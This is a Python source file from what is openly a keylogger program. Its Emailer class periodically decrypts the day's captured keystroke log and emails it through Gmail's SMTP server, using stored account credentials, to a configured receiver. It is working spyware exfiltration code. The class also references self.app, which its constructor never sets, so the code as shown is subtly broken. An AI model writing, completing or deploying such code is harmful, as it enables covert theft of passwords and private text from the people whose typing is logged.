import smtplib
from email.mime.text import MIMEText
import datetime
import os
import time
from tkinter import messagebox

class Emailer:
    def __init__(self, settings, encryption):
        self.settings = settings
        self.encryption = encryption

    def email_logs_periodically(self):
        while self.app.is_logging and self.settings.config["email_config"]["enabled"]:
            self.app.logger.save_log()
            date = datetime.datetime.now().strftime("%Y-%m-%d")
            log_file = os.path.join(self.settings.config["log_folder"], f"log_{date}.txt")
            if os.path.exists(log_file):
                try:
                    with open(log_file, "rb") as f:
                        content = self.encryption.cipher.decrypt(f.read()).decode()
                    msg = MIMEText(content)
                    msg["Subject"] = f"Keylogger Log {date}"
                    msg["From"] = self.settings.config["email_config"]["email"]
                    msg["To"] = self.settings.config["email_config"]["receiver"]
                    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
                        server.login(self.settings.config["email_config"]["email"], self.settings.config["email_config"]["password"])
                        server.sendmail(self.settings.config["email_config"]["email"], self.settings.config["email_config"]["receiver"], msg.as_string())
                    time_str = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
                    self.app.logger.keys.append(f"[{time_str}]  [EMAIL SENT] (0s) [SAVED]")
                    self.app.logger.update_preview(self.app.logger.keys[-1])
                except Exception as e:
                    messagebox.showerror("Error", f"Email failed: {str(e)}")
            time.sleep(self.settings.config["email_config"]["interval"])